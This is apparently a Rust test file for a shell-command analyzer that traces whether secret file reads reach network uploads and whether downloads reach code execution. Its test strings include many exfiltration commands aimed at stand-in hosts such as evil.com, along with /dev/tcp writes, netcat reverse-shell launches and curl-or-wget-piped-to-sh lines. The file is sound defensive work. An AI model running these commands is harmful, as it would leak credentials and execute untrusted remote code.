use std::collections::{BTreeSet, VecDeque};

use effinterp_engine::{AnalysisLimits, Engine, PlanBuilder, default_limits};
use effinterp_proto::{
    CausalAssurance, CausalReason, CausalityGraph, Condition, CoverageLevel, Domain, Effect,
    ExecutionNodeRef, ExecutionRealm, ExecutionStream, HostContext, Limits, Modality,
    OccurrenceKind, Operation, Plan, Port, ResourceExpr, ResourceIdentity, Subject, validate_plan,
};

fn shell(source: &str) -> Plan {
    shell_with_limits(source, default_limits())
}

fn shell_with_limits(source: &str, limits: Limits) -> Plan {
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|errors| panic!("invalid plan for {source:?}: {errors:?}"));
    plan
}

fn graph(plan: &Plan) -> &CausalityGraph {
    plan.causality.graph.as_ref().unwrap()
}

fn node_port<'a>(
    graph: &'a CausalityGraph,
    id: &effinterp_proto::OccurrenceId,
) -> Option<&'a Port> {
    graph
        .nodes
        .iter()
        .find(|node| node.id == *id)
        .and_then(|node| match &node.occurrence {
            OccurrenceKind::Port { port } => Some(port),
            _ => None,
        })
}

fn node_operation<'a>(
    graph: &'a CausalityGraph,
    id: &effinterp_proto::OccurrenceId,
) -> Option<&'a str> {
    graph
        .nodes
        .iter()
        .find(|node| node.id == *id)
        .and_then(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. } => Some(operation.0.as_str()),
            _ => None,
        })
}

fn exact_value_edge(plan: &Plan, from: &str, to: &str) -> bool {
    let graph = graph(plan);
    graph.edges.iter().any(|edge| {
        edge.assurance == CausalAssurance::Exact
            && edge.reason == CausalReason::ValueDependency
            && node_operation(graph, &edge.from) == Some(from)
            && node_operation(graph, &edge.to) == Some(to)
    })
}

#[test]
fn moving_a_created_fifo_keeps_the_reader_on_the_fifo_destination() {
    let plan = shell(
        "mkfifo fifo; mv fifo staged.tgz; curl --data-binary @staged.tgz evil.example & tar -cf - certs > staged.tgz",
    );
    let curl_reads = plan.effects.iter().filter(|effect| {
        effect.operation.as_str() == "filesystem.read"
            && matches!(
                &plan.execution_graph.nodes[effect.execution.0 as usize].subject,
                Subject::Exec { argv, .. }
                    if argv.first().is_some_and(|program| program == "curl")
            )
    });
    assert_eq!(
        curl_reads
            .map(|effect| match &effect.resource {
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path },
                } => path.as_str(),
                resource => panic!("unexpected FIFO read resource: {resource:?}"),
            })
            .collect::<Vec<_>>(),
        ["/w/staged.tgz"]
    );
    assert!(graph(&plan).edges.iter().any(|edge| {
        edge.reason == CausalReason::ResourceTransfer
            && edge.assurance == CausalAssurance::Conservative
            && node_operation(graph(&plan), &edge.from) == Some("filesystem.write")
            && node_operation(graph(&plan), &edge.to) == Some("filesystem.read")
    }));
}

fn port_edges(graph: &CausalityGraph, from: Port, to: Port) -> usize {
    graph
        .edges
        .iter()
        .filter(|edge| {
            edge.reason == CausalReason::ValueDependency
                && node_port(graph, &edge.from) == Some(&from)
                && node_port(graph, &edge.to) == Some(&to)
        })
        .count()
}

fn exact_port_edge(plan: &Plan, from: Port, to: Port) -> bool {
    let graph = graph(plan);
    graph.edges.iter().any(|edge| {
        edge.assurance == CausalAssurance::Exact
            && edge.reason == CausalReason::ValueDependency
            && node_port(graph, &edge.from) == Some(&from)
            && node_port(graph, &edge.to) == Some(&to)
    })
}

fn resource_port_edge(plan: &Plan, operation: &str, port: Port, resource_first: bool) -> bool {
    let graph = graph(plan);
    graph.edges.iter().any(|edge| {
        let (resource, port_id) = if resource_first {
            (&edge.from, &edge.to)
        } else {
            (&edge.to, &edge.from)
        };
        node_port(graph, port_id) == Some(&port)
            && graph.nodes.iter().any(|node| {
                node.id == *resource
                    && matches!(
                        &node.occurrence,
                        OccurrenceKind::ResourceInteraction { operation: op, .. }
                            if op.0 == operation
                    )
            })
    })
}

fn reaches(plan: &Plan, from: &str, to: &str) -> bool {
    let graph = graph(plan);
    let starts: Vec<_> = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == from => {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    let targets: BTreeSet<_> = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == to => {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    starts
        .into_iter()
        .any(|start| reaches_from(graph, start, &targets))
}

fn reaches_from_value(plan: &Plan, value: &str, operation: &str) -> bool {
    let graph = graph(plan);
    let starts = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::Value {
                value: ResourceExpr::Literal { value: actual },
            } if actual == value => Some(node.id.clone()),
            _ => None,
        });
    let targets = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction {
                operation: actual, ..
            } if actual.0 == operation => Some(node.id.clone()),
            _ => None,
        })
        .collect::<BTreeSet<_>>();
    starts
        .into_iter()
        .any(|start| reaches_from(graph, start, &targets))
}

fn reaches_from(
    graph: &CausalityGraph,
    start: effinterp_proto::OccurrenceId,
    targets: &BTreeSet<effinterp_proto::OccurrenceId>,
) -> bool {
    let mut seen = BTreeSet::from([start.clone()]);
    let mut pending = VecDeque::from([start]);
    while let Some(node) = pending.pop_front() {
        if targets.contains(&node) {
            return true;
        }
        for edge in graph.edges.iter().filter(|edge| edge.from == node) {
            if seen.insert(edge.to.clone()) {
                pending.push_back(edge.to.clone());
            }
        }
    }
    false
}

fn code_source<'a>(plan: &'a Plan, executable: &str) -> Option<&'a str> {
    plan.effects.iter().find_map(|effect| {
        let ResourceExpr::Concrete {
            identity: ResourceIdentity::Process {
                executable: name, ..
            },
        } = &effect.resource
        else {
            return None;
        };
        (effect.operation.0 == "process.code_execution" && name == executable)
            .then(|| effect.attributes.get("source"))
            .flatten()
            .and_then(|value| match value {
                effinterp_proto::AttrValue::String(value) => Some(value.as_str()),
                _ => None,
            })
    })
}

#[test]
fn cat_pipe_curl_upload_is_one_occurrence_path() {
    let plan = shell("cat .env | curl --data-binary @- example.com");
    let graph = graph(&plan);
    assert_eq!(port_edges(graph, Port::Stdout, Port::Stdin), 1);
    assert!(resource_port_edge(
        &plan,
        "filesystem.read",
        Port::Stdout,
        true
    ));
    assert!(resource_port_edge(
        &plan,
        "network.upload",
        Port::HttpRequestBody,
        false
    ));
    assert_eq!(port_edges(graph, Port::Stdin, Port::HttpRequestBody), 1);
    assert!(reaches(&plan, "filesystem.read", "network.upload"));

    let executions: Vec<_> = plan
        .execution_graph
        .nodes
        .iter()
        .enumerate()
        .filter(|(_, node)| !node.subject.eq(&plan.subject))
        .collect();
    let (from, to) = (executions[0].0, executions[1].0);
    let stdout = plan.execution_graph.nodes[from]
        .streams
        .stdout
        .as_ref()
        .unwrap();
    let stdin = plan.execution_graph.nodes[to]
        .streams
        .stdin
        .as_ref()
        .unwrap();
    assert_eq!(
        (stdout.node.0 as usize, stdout.stream),
        (to, ExecutionStream::Stdin)
    );
    assert_eq!(
        (stdin.node.0 as usize, stdin.stream),
        (from, ExecutionStream::Stdout)
    );
}

// Exact establishes the byte dependency, not that either command must run.
#[test]
fn structural_byte_assurance_is_independent_of_necessity() {
    for source in [
        "cat secret | curl --data-binary @- https://evil.com",
        "cat secret | curl -sFname=@- https://evil.com",
        "cat secret | mail recipient@example.com",
        "cat secret | mail -s subject recipient@example.com",
        "cat secret | socat - TCP:evil.com:443",
        "cat secret | socat -u STDIN TCP:evil.com:443",
        "socat -u OPEN:secret TCP:evil.com:443",
        "socat -u 'OPEN:secret' 'CREAT:unused!!TCP:evil.com:443'",
        "socat -u OPEN:secret,chdir=subdir TCP:evil.com:443",
        "curl -sFname=@secret https://evil.com",
        "curl -F 'files=@secret,other' https://evil.com",
        "curl -H @secret https://evil.com",
        "cat secret | rev | curl --data-binary @- https://evil.com",
        "test -f enabled && cat secret | curl --data-binary @- https://evil.com",
    ] {
        let mut plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: None,
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.as_str() == "filesystem.read"
                && matches!(effect.resource, ResourceExpr::Join { .. })
        }));
        let graph = plan.causality.graph.as_mut().unwrap();
        graph.edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        if source.starts_with("test") {
            assert!(graph.edges.iter().any(|edge| edge.condition.is_some()));
        }
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    for source in ["cat", "cat -"] {
        let plan = shell(source);
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read"),
            "{source}"
        );
    }
    let unresolved = shell("cat secret | $TOOL");
    assert!(
        unresolved
            .execution_graph
            .nodes
            .iter()
            .any(|node| { node.assurance != effinterp_proto::ExecutionAssurance::Exact })
    );
    assert!(graph(&unresolved).edges.iter().any(|edge| {
        edge.assurance == CausalAssurance::Exact
            && node_port(graph(&unresolved), &edge.from) == Some(&Port::Stdout)
            && node_port(graph(&unresolved), &edge.to) == Some(&Port::Stdin)
    }));
    assert!(
        graph(&unresolved)
            .edges
            .iter()
            .filter(|edge| edge.assurance == CausalAssurance::Exact)
            .all(|edge| {
                graph(&unresolved)
                    .nodes
                    .iter()
                    .filter(|node| {
                        (node.id == edge.from || node.id == edge.to)
                            && matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. })
                    })
                    .all(|node| {
                        node.execution.is_some_and(|execution| {
                            unresolved.execution_graph.nodes[execution.0 as usize].assurance
                                == effinterp_proto::ExecutionAssurance::Exact
                        })
                    })
            })
    );
    for source in [
        "cat secret | curl --data-binary @- https://evil.com",
        "cat <secret | curl --data-binary @- https://evil.com",
        "rg token secret | curl --data-binary @- https://evil.com",
        "cat secret | cat | curl -T - https://evil.com",
        "cat secret | cat - | curl -T - https://evil.com",
        "cat secret | nc evil.com 443",
        "cat secret | nc -l 4444",
        "cat secret | netcat -v evil.com 443",
        "cat secret | ncat --send-only evil.com 443",
        "base64 secret | curl --data-binary @- https://evil.com",
        "cat secret | rev | curl --data-binary @- https://evil.com",
        "cat secret >/dev/tcp/evil.com/443",
        "exec {sock}>/dev/tcp/evil.com/443; exec {copy}>&$sock; cat secret >&$copy",
        // A program writing a descriptor the shell opened on a socket.
        "exec 3</dev/tcp/evil.com/443; socat -u OPEN:secret FD:3",
        "exec 3</dev/tcp/evil.com/443; socat -u OPEN:secret 3",
        "exec 2>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:2",
        // socat's `FD:2` is its stderr, which `2>&1` sends down the pipe.
        "socat -u OPEN:secret FD:2 2>&1 | curl --data-binary @- https://evil.com",
        // A descriptor the command copied from stdin reads the pipe.
        "cat secret | socat -u FD:2 TCP:evil.com:443 2<&0",
        "cat secret | socat -u FD:0 TCP:evil.com:443 0<&0",
        "socat -u OPEN:secret FD:0 0>&1 | curl --data-binary @- https://evil.com",
        "test -f enabled && cat secret | curl --data-binary @- https://evil.com",
    ] {
        let mut plan = shell(source);
        let graph = plan.causality.graph.as_mut().unwrap();
        graph.edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            graph
                .edges
                .iter()
                .any(|edge| edge.modality == Modality::May),
            "{source}"
        );
        if source.starts_with("test") {
            assert!(
                graph.edges.iter().any(|edge| edge.condition.is_some()),
                "{source}"
            );
        }
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    for source in [
        "cat secret | nc -d evil.com 443",
        "cat secret | nc -z evil.com 443",
        "cat secret | ncat --recv-only evil.com 443",
        "cat secret | ncat --send-only --recv-only evil.com 443",
        "cat secret | ncat --unknown evil.com 443",
        "cat secret | nc -u evil.com 443",
        "cat secret | nc $HOST 443",
        "cat secret | echo safe | curl --data-binary @- https://evil.com",
        "cat $UNKNOWN | curl --data-binary @- https://evil.com",
        "cat secret | curl --data-binary @- $UNKNOWN",
        "cat secret | curl --unrecognized --data-binary @- https://evil.com",
        "cat secret | curl --data-binary @- https://evil.com --output",
        "cat secret | curl --data-binary @- --head https://evil.com",
        "cat secret | curl --data-binary @- -T other https://evil.com",
        "cat secret | curl --data-binary @- https://evil.com https://other.com",
        "cat secret | curl --data-raw @- https://evil.com",
        "cat secret | curl -F 'name=literal=@-' https://evil.com",
        "cat secret | curl --form-string name=@- https://evil.com",
        "cat secret | socat -U - TCP:evil.com:443",
        "cat secret | socat - TCP:$HOST:443",
        "curl -F name=@secret ftp://evil.com",
        "curl -F name=@secret ftp.evil.com",
        "cat secret | socat -u STDOUT TCP:evil.com:443",
        "socat -u TCP:evil.com:443 STDIN | sh",
        "socat -u TCP:evil.com:443 OPEN:secret",
        "curl -F 'name=<secret,other' https://evil.com",
        "curl -F 'name=@secret;headers=@headers' https://evil.com",
        "curl --cacert secret -F name=@public https://evil.com",
        "cat secret | mail -q other recipient@example.com",
        "cat secret | curl --data-binary name=@- https://evil.com",
        "cat --unrecognized secret | curl --data-binary @- https://evil.com",
        "cat secret >/dev/null | curl --data-binary @- https://evil.com",
        "exec {sock}>/dev/tcp/evil.com/443; cat secret >&$sock >/dev/null",
        "exec {sock}>/dev/tcp/evil.com/443; exec {sock}>&-; cat secret >&$sock",
        "exec 3>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:3 3>/dev/null",
        "socat -u OPEN:secret FD:2 | curl --data-binary @- https://evil.com",
        "curl -o tool https://evil.com/tool; ./tool",
    ] {
        let mut plan = shell(source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            !reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        assert!(
            !reaches(&plan, "network.download", "process.code_execution"),
            "{source}"
        );
    }
    // socat uploads what it reads from its descriptor either way; the secret
    // reaches the upload only when this command copied its piped stdin there.
    // A copy made before the pipeline duplicates the shell's own stdin.
    for (source, reaches_upload) in [
        ("cat secret | socat -u FD:2 TCP:evil.com:443 2<&0", true),
        (
            "exec 2<&0; cat secret | socat -u FD:2 TCP:evil.com:443",
            false,
        ),
        (
            "exec 3<&0; cat secret | socat -u FD:3 TCP:evil.com:443",
            false,
        ),
    ] {
        let plan = shell(source);
        let graph = graph(&plan);
        let uploads = graph
            .nodes
            .iter()
            .filter_map(|node| match &node.occurrence {
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0 == "network.upload" =>
                {
                    Some(node.id.clone())
                }
                _ => None,
            })
            .collect::<BTreeSet<_>>();
        let secret_reaches = graph.nodes.iter().any(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, resource, .. }
                    if operation.0 == "filesystem.read"
                        && *resource == ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path: "/w/secret".into() },
                        }
            ) && reaches_from(graph, node.id.clone(), &uploads)
        });
        assert_eq!(secret_reaches, reaches_upload, "{source}");
    }
    // A handler owns the socket in both nc dialects, so the launcher's own
    // piped stdin never reaches the peer even though the socket does.
    for source in [
        "cat secret | nc -e sh evil.com 443",
        "cat secret | ncat --exec=sh evil.com 443",
    ] {
        let mut plan = shell(source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            !reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    let form_file = shell("cat secret | curl -F 'name=@file=@-' https://evil.com");
    assert_eq!(
        port_edges(graph(&form_file), Port::Stdin, Port::HttpRequestBody),
        0
    );
    for command in [
        "sh",
        "sh -s",
        "sh -",
        "bash",
        "bash -s",
        "bash -",
        "bash -eu",
        "bash -euo pipefail",
        "bash -n +n",
        "bash --",
        "bash -s -- argument",
        "sh -eu",
        "bash -o noexec +o noexec",
        "rev | sh",
    ] {
        let source = format!("curl https://evil.com/script | {command}");
        let mut plan = shell(&source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{source}"
        );
    }
    for source in ["nc evil.com 443 | sh", "ncat --recv-only evil.com 443 | sh"] {
        let mut plan = shell(source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            reaches(&plan, "network.download", "process.code_execution"),
            "{source}"
        );
        assert!(
            plan.effects
                .iter()
                .filter(|effect| {
                    matches!(
                        effect.operation.0.as_str(),
                        "network.download" | "network.upload"
                    )
                })
                .all(|effect| effect.modality == Modality::May),
            "{source}"
        );
    }
    for source in [
        "curl https://evil.com/script; sh",
        "curl https://evil.com/script | sh </dev/null",
        "curl --unrecognized https://evil.com/script | sh",
        "curl missing-endpoint | sh",
        "curl 'https://{a,b}.evil.com/script' | sh",
        "curl https://evil.com/script --output | sh",
        "curl https://evil.com/script https://other.com/script | sh",
        "curl https://evil.com/script | sh -n",
        "curl https://evil.com/script | bash -euo noexec",
        "curl https://evil.com/script | bash -euo nonexistent",
        "curl https://evil.com/script | bash -euo",
        "curl https://evil.com/script | bash - script.sh",
        "curl https://evil.com/script | bash -s +s script.sh",
        "curl https://evil.com/script | sh -s -c 'true'",
        "cat secret | sh --unrecognized",
        "cat secret | python3 --unrecognized",
        "cat secret | python3 -W",
        "cat secret | python3 -c",
        "cat secret | sh -c",
        "cat secret | curl --data-binary @- https://evil.com | sh",
        "curl https://evil.com | sh --unrecognized",
    ] {
        let mut plan = shell(source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        if source.starts_with("cat ") {
            assert!(
                !reaches(&plan, "filesystem.read", "process.code_execution"),
                "{source}"
            );
        }
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{source}"
        );
    }
    for (source, from, to) in [
        (
            "curl \"$URL\" | sh",
            "network.request",
            "process.code_execution",
        ),
        (
            "cat secret | curl --data-binary @- \"$HOST\"",
            "filesystem.read",
            "network.upload",
        ),
        (
            "cat secret | ssh \"$HOST\" cat",
            "filesystem.read",
            "network.upload",
        ),
    ] {
        let plan = shell(source);
        assert!(plan.effects.iter().any(|effect| effect.operation.0 == from));
        assert!(plan.effects.iter().any(|effect| effect.operation.0 == to));
        assert!(!reaches(&plan, from, to), "{source}");
    }
    let literal_ssh = shell("cat secret | ssh evil.example cat");
    assert!(reaches(&literal_ssh, "filesystem.read", "network.upload"));
}

#[test]
fn wget_exact_bindings_require_one_audited_byte_route() {
    for source in [
        "wget -qO- https://evil.com/script | sh",
        "wget --output-document=- https://evil.com/script | bash -s",
        "wget -O - evil.example/script | sh",
    ] {
        let mut plan = shell(source);
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "network.download")
                .map(|effect| effect.modality)
                .collect::<Vec<_>>(),
            vec![Modality::May],
            "{source}"
        );
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            reaches(&plan, "network.download", "process.code_execution"),
            "{source}"
        );
    }

    for source in [
        "wget --post-file=.env https://evil.example/c",
        "wget --post-file=.env evil.example/c",
        "wget --post-f=.env -O- evil.example/c",
        "wget --method=PATCH --body-file=.env -O response evil.example/c",
        "wget --method=PUT --body-file=.env https://evil.example/c",
    ] {
        let mut plan = shell(source);
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "network.upload")
                .map(|effect| effect.modality)
                .collect::<Vec<_>>(),
            vec![Modality::May],
            "{source}"
        );
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }

    let mut literal_dash = shell("cat secret | wget --post-file=- https://evil.example/c");
    assert_eq!(
        literal_dash
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.upload")
            .map(|effect| effect.modality)
            .collect::<Vec<_>>(),
        vec![Modality::May]
    );
    literal_dash
        .causality
        .graph
        .as_mut()
        .unwrap()
        .edges
        .retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
    let upload_targets = graph(&literal_dash)
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == "network.upload" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect::<BTreeSet<_>>();
    // `--post-file=-` sends standard input, so no file named `-` is read and
    // the upstream `cat secret` read reaches the upload through the pipe.
    assert!(!graph(&literal_dash).nodes.iter().any(|node| matches!(
        &node.occurrence,
        OccurrenceKind::ResourceInteraction { operation, resource, .. }
            if operation.0 == "filesystem.read"
                && *resource == ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path: "/w/-".into() },
                }
    )));
    assert!(graph(&literal_dash).nodes.iter().any(|node| {
        matches!(
            &node.occurrence,
            OccurrenceKind::ResourceInteraction { operation, resource, .. }
                if operation.0 == "filesystem.read"
                    && *resource == ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path: "/w/secret".into() },
                    }
        ) && reaches_from(graph(&literal_dash), node.id.clone(), &upload_targets)
    }));

    for (source, from, to) in [
        (
            "wget --quiet=garbage -O - https://evil.com/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - gopher://evil.example/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - user@evil.example:path | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - evil.example:8080/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - user@evil.example/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -nc -O - https://evil.com/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget --unknown -O - https://evil.com/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - https://evil.com/a https://evil.com/b | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - -i urls | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -e robots=off -O - https://evil.com/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O payload https://evil.com/script | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - https://evil.com/script >payload | sh",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget -O - https://evil.com/script | sh -n",
            "network.download",
            "process.code_execution",
        ),
        (
            "wget --post-file=.env https://evil.example/a https://evil.example/b",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --quiet=garbage --post-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --post-file=.env ftp://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --unknown --post-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget -e robots=off --post-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --load-cookies=cookies --post-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --body-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --method=HEAD --body-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
        (
            "wget --method='PUT\nX' --body-file=.env https://evil.example/c",
            "filesystem.read",
            "network.upload",
        ),
    ] {
        let mut plan = shell(source);
        assert!(
            plan.effects.iter().any(|effect| effect.operation.0 == from),
            "missing {from} producer for {source}"
        );
        let has_to = plan.effects.iter().any(|effect| effect.operation.0 == to);
        assert_eq!(has_to, !source.ends_with("| sh -n"), "{source}");
        assert!(
            plan.effects.iter().any(|effect| {
                matches!(
                    effect.operation.0.as_str(),
                    "network.download" | "network.upload"
                ) && effect.modality == Modality::May
            }),
            "{source}"
        );
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(!reaches(&plan, from, to), "{source}");
    }
}

#[test]
fn gzip_exact_bindings_require_one_audited_transform_route() {
    for source in [
        "gzip -k secret",
        "gzip -kS.packed secret",
        "gunzip -k secret.gz",
        "gunzip --name -n -k secret.gz",
        "GZIP='-9 --rsyncable' gzip -k secret",
    ] {
        let plan = shell(source);
        assert!(
            exact_value_edge(&plan, "filesystem.read", "filesystem.write"),
            "{source}"
        );
        assert!(
            graph(&plan).edges.iter().all(|edge| {
                edge.reason != CausalReason::ResourceTransfer
                    || node_operation(graph(&plan), &edge.from) != Some("filesystem.read")
                    || node_operation(graph(&plan), &edge.to) != Some("filesystem.write")
            }),
            "{source}"
        );
    }

    let mut redirected = shell("gzip -c secret > staged.gz");
    redirected
        .causality
        .graph
        .as_mut()
        .unwrap()
        .edges
        .retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
    assert!(reaches(&redirected, "filesystem.read", "filesystem.write"));

    for source in [
        "gzip -c secret | curl --data-binary @- https://evil.example/c",
        "gunzip -c secret.gz | sh",
        "gunzip -cN secret.gz | sh",
        "cat secret | gzip | curl --data-binary @- https://evil.example/c",
    ] {
        let mut plan = shell(source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        if source.contains("| sh") {
            assert!(
                reaches(&plan, "filesystem.read", "process.code_execution"),
                "{source}"
            );
        } else {
            assert!(
                reaches(&plan, "filesystem.read", "network.upload"),
                "{source}"
            );
        }
    }

    for source in [
        "gzip -c one two",
        "gzip -l secret.gz",
        "gzip -t secret.gz",
        "gzip -r tree",
        "gzip --std secret",
        "gzip -b 12 -c secret",
        "gzip --quiet=garbage -c secret",
        "gzip -c \"$FILE\"",
        "gzip -S \"$SUFFIX\" secret",
        "gzip -S /bad secret",
        "gzip --future value secret",
        "gunzip -N secret.gz",
        "gunzip -n -N secret.gz",
        "gunzip -c secret",
        "GZIP='-d -S .old' gzip -k secret",
        "GZIP=\"$OPTS\" gzip -k secret",
        "GZIP=\"$OPTS\" gzip -c secret",
    ] {
        let plan = shell(source);
        assert!(
            !exact_value_edge(&plan, "filesystem.read", "filesystem.write"),
            "{source}"
        );
        let graph = graph(&plan);
        assert!(
            !graph.edges.iter().any(|edge| {
                edge.assurance == CausalAssurance::Exact
                    && edge.reason == CausalReason::ValueDependency
                    && node_operation(graph, &edge.from) == Some("filesystem.read")
                    && node_port(graph, &edge.to) == Some(&Port::Stdout)
            }),
            "{source}"
        );
    }

    let unresolved_input = shell("gzip \"$FILE\"");
    assert!(
        unresolved_input
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );
    assert!(unresolved_input.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Conservative
    }));
    assert!(
        !unresolved_input
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(!exact_value_edge(
        &unresolved_input,
        "filesystem.read",
        "filesystem.write"
    ));

    let mut inherited =
        shell("cat secret | GZIP=\"$OPTS\" gzip | curl --data-binary @- https://evil.example/c");
    inherited
        .causality
        .graph
        .as_mut()
        .unwrap()
        .edges
        .retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
    assert!(
        !inherited
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "process.stream_transform")
    );
    assert!(!reaches(&inherited, "filesystem.read", "network.upload"));
}

#[test]
fn byte_transforms_reach_only_their_actual_code_consumers() {
    for (source, direct_stream, executed, transform) in [
        (
            "cat encoded | base64 --decode | sh",
            true,
            true,
            Some("decode"),
        ),
        ("base64 -di input | bash", false, true, Some("decode")),
        // BSD base64 and uutils base64 and base32 decode with `-D`.
        ("cat encoded | base64 -D | sh", true, true, Some("decode")),
        ("cat encoded | base32 -D | sh", true, true, Some("decode")),
        ("cat encoded | base64 -d - | sh", true, true, Some("decode")),
        ("cat encoded | base64 | sh", true, true, None),
        ("cat encoded | base64 -i | sh", true, true, None),
        (
            "cat encoded | base64 -d >out | sh",
            true,
            false,
            Some("decode"),
        ),
        (
            "cat encoded | base64 -d | sh -n",
            true,
            false,
            Some("decode"),
        ),
        (
            "cat encoded | base64 -d | echo safe | sh",
            true,
            false,
            Some("decode"),
        ),
        ("cat encoded | base64 -d --unknown | sh", false, false, None),
        (
            "cat encoded | base64 -d --decode=false | sh",
            false,
            false,
            None,
        ),
        ("cat encoded | base64 -d --help | sh", false, false, None),
        ("cat encoded | base64 -d one two | sh", false, false, None),
        (
            "cat encoded | base64 -d --wrap=bad | sh",
            false,
            false,
            None,
        ),
        ("cat encoded | base64 -d --wrap | sh", false, false, None),
        ("cat encoded | gzip | sh", true, true, None),
        ("cat encoded | gzip -d | sh", true, true, Some("decode")),
        ("cat encoded | gunzip | sh", true, true, Some("decode")),
        ("cat encoded | bzip2 | sh", true, true, None),
